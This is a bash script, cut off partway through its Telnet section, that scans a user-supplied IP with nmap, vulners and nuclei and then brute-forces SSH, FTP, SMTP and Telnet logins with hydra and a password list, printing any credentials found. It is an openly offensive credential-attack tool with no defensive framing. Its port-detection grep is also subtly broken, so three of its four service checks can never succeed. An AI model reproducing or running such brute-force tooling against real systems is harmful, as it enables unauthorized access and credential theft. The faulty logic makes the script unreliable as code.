#!/bin/bash

echo "Define target IP address"
read target_ip

# Scan target for open ports
echo "Scanning target for open ports..."
nmap -sV -Pn $target_ip

  # Scan target for vulnerabilities using Nmap
  echo "Scanning target for vulnerabilities using Nmap..."
  nmap_output=$(nmap -sV --script vulners $target_ip)
  if [ -z "$nmap_output" ]; then
    echo "No open ports found."
  else
    # Use Nuclei to scan for vulnerabilities on the target using the open ports found by Nmap
    nuclei -u http://$target_ip/
  fi

# Target host and port
read -p "Enter username: " username
read -p "Enter target IP address: " target_ip
read -p "Enter path to password file: " path_to_pass_file
ssh_port=22
ftp_port=21
smtp_port=25
telnet_port=23

# Nmap scan
nmap_result=$(nmap -p $ssh_port,$ftp_port,$smtp_port,$telnet_port $target_ip | grep -oP "$ssh_port|open" | tr '\n' ' ')

# Hydra SSH brute force
if [[ $nmap_result == *"$ssh_port open"* ]]; then
    ssh_result=$(hydra -l $username -P $path_to_pass_file ssh://$target_ip:$ssh_port)
    if [[ $ssh_result == *"login:"* ]]; then
        echo "SSH credentials found:"
        echo $ssh_result
    else
        echo "No SSH credentials found"
    fi
fi

# Hydra FTP brute force
if [[ $nmap_result == *"$ftp_port open"* ]]; then
    ftp_result=$(hydra -l $username -P $path_to_pass_file ftp://$target_ip:$ftp_port)
    if [[ $ftp_result == *"login:"* ]]; then
        echo "FTP credentials found:"
        echo $ftp_result
    else
        echo "No FTP credentials found"
    fi
fi

# Hydra SMTP brute force
if [[ $nmap_result == *"$smtp_port open"* ]]; then
    smtp_result=$(hydra -l $username -P $path_to_pass_file smtp://$target_ip:$smtp_port)
    if [[ $smtp_result == *"login:"* ]]; then
        echo "SMTP credentials found:"
        echo $smtp_result
    else
        echo "No SMTP credentials found"
    fi
fi

# Hydra Telnet brute force
if [[ $nmap_result == *"$telnet_port open"* ]]; then
    telnet_result=$(hydra -l $username -P $path_to_pass_file telnet://$target_ip:$telnet_port)
    if [[ $telnet_result == *"login:"* ]]; then
        echo
